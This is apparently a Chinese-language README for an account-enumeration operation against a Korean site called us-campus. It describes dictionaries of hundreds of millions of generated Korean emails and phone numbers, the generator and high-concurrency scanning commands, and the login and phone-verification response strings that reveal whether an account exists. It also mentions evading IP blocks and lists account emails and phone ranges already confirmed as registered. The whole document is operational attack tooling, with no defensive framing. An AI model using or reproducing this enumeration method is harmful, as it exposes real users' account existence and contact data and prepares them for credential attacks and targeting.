# us-campus 邮箱/手机号枚举字典 & 脚本

## 字典规模（服务器本地）

| 文件 | 条数 | 大小 | 说明 |
|------|------|------|------|
| `emails_kr_large.txt` | **102 万** | 21 MB | 基础韩国邮箱字典 |
| `emails_kr_xl.txt` | **4.25 亿** | 8.5 GB | 超大邮箱字典（姓名+数字+出生年+三字母+手机号样式） |
| `phones_kr_hot.txt` | **1.28 亿** | 1.5 GB | 高命中号段（含 deep21 实测段 + 运营商前缀） |
| `phones_010_full.txt` | **1 亿** | 1.2 GB | 010 全段 00000000–99999999 |
| `phones_legacy.txt` | **5000 万** | 525 MB | 011/016/017/018/019 旧号段 |
| `phones_010_sample1pct.txt` | **100 万** | 12 MB | 010 全段 1% 采样（每 100 取 1） |
| `phones_kr_targeted.txt` | **2 万** | 235 KB | 已知命中号 ±1000 邻域 |

**合计**：邮箱约 **4.26 亿** 条，手机号约 **2.79 亿** 条（各文件有重叠）。

## 生成器

```bash
cd /workspace/us-campus-recon/dict

# 邮箱
python3 gen_emails_kr.py          # 102 万条基础版
python3 gen_emails_kr_xl.py       # 4.25 亿条超大版 (~1 分钟)

# 手机号
python3 gen_phones_kr.py hot       # 高命中段 1.28 亿
python3 gen_phones_kr.py 010       # 010 全量 1 亿
python3 gen_phones_kr.py legacy    # 旧号段 5000 万
python3 gen_phones_kr.py targeted  # 已知命中邻域 ~2 万
python3 gen_phones_kr.py sample    # 010 采样 100 万
python3 gen_phones_kr.py sample10  # 010 采样 1000 万
```

## 邮箱枚举

```bash
# 全速扫描（~650/s，并发250）
python3 fast_email_enum.py --dict emails_kr_large.txt --concurrency 250

# XL 字典（4.25亿，约7.6天）
python3 fast_email_enum.py --dict emails_kr_xl.txt --concurrency 250

# 测试
python3 fast_email_enum.py --limit 5000 --concurrency 250
```

**命中判断**（`POST /login/login`）：
- `비밀번호가 일치하지 않습니다` → 已注册
- `이메일 또는 비밀번호를 다시 입력해 주세요` → 未注册

| 并发 | 速度 | 扫完 102 万 | 扫完 4.25 亿 |
|------|------|-------------|--------------|
| **250** | **~650/s** | **~26 分钟** | **~7.6 天** |
| 80 (旧版) | ~50/s | ~5.7 小时 | ~99 天 |

结果输出：`enum_hits.json`

## 手机号枚举

```bash
# 推荐：targeted 邻域（2万）
python3 fast_phone_enum.py --dict phones_kr_targeted.txt --concurrency 150 --turbo

# 高命中段全速（易封IP）
python3 fast_phone_enum.py --dict phones_kr_hot.txt --concurrency 200 --workers 10 --turbo
```

**前置条件**：需先 `GET /member/join` 获取 cookie。

**命中判断**（`POST /member/cellphoneCert`）：
- 响应含 `이미 회원` → 已注册

结果输出：`phone_hits.json`

## 已确认命中（参考）

**邮箱**：dev@、ansuho@、ansuho1@、thkim@、test@test.com（@us-all.co.kr 等）

**手机**：37 个见 `../deep21_phones_unique.txt`，集中在 0103456、0102024、0102222、0103333 段
